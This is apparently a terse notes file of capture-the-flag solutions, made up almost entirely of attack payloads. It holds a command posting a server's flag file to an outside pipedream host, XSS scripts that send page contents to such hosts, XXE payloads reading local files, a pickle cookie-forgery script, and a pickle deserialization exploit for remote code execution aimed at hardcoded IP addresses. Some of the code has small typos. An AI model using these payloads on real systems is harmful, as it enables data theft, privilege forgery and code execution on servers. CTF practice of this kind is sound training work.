# ctf
ctf

Downloader-v1:
https://eodlwq7lnoytrkk.m.pipedream.net / --post-file '/var/www/html/flag.php' 

framable:
<script> 
var exfil = document.getElementsByTagName("body")[0].innerHTML; 
window.location.href="https://enmi59d56bybo.x.pipedream.net?gio=" + btoa(exfil); 
</script> 

manual-review:
<script>window.location.href="https://your-pipedream-url.x.pipedream.net/hello";</script> 

cyntaxcheck payloads:
payload 1: 
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM 
"file:///var/www/html/flag"> 
]> 
<foo> 
</foo> 
Payload 2: 
&xxe; 
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM 
"php://filter/convert.base64-encode/resource=/var/www/html/flag"> 
]> 
<foo> 
&xxe; 
</foo> 

alpa-cookie:
pip install pwntools 
python3 

 from pwn import xor 
 decoded_data = 
bytes.fromhex("6f50327a481d6d33243e3f5a32375d2427765d486933047422362b3a6b3b2a04
 4c3c64") 
key = "G4BJBNJCALR3AD4KIQW8X9WSWENHL1Z6FOJ" 
result = xor(decoded_data, key)
print(result)
import pickle 
parsed_data = pickle.loads(b"(dp0\nS'permission'\np1\nS'user'\np2\ns.") 
print(parsed_data)
 parsed_data['permission'] = 'admin' 
mofified_payload = pickle.dumps(parsed_data, protocol=2) 
print(modified_payload)
print(mofified_payload)
encoded_payload = xor(mofified_payload, key)
 print(encoded_payload.hex())

 rundown:
 curl -X POST "http://35.198.127.202:30947/" > output.html 
 firefox output.html
Payload:  
import pickle as cPickle 
import base64 
import os 
import string 
import requests 
import time 
class Exploit(object): 
def __reduce__(self): 
return (eval, ('eval(open("flag","r").read())',)) 
def sendPayload(p): 
newp = base64.urlsafe_b64encode(p).decode() 
headers = {'Content-Type': 'application/T3jv1l'} 
r = 
requests.post("http://34.159.172.66:32274/",headers=headers,data=newp) 
return r.text 
payload_dec = cPickle.dumps(Exploit(), protocol=2) 
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + 
"}") 
